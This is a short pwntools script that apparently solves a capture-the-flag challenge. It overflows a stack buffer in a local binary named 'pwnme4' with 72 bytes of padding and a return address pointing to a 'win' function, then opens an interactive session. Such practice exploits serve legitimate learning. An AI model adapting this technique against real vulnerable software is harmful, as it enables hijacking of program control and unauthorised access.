from pwn import *

elf = ELF('./pwnme4')
p = process('./pwnme4')

win_addr = 0x401176

padding = b'A'* 72
payload = padding + p64(win_addr)

p.sendline(payload)
p.interactive()
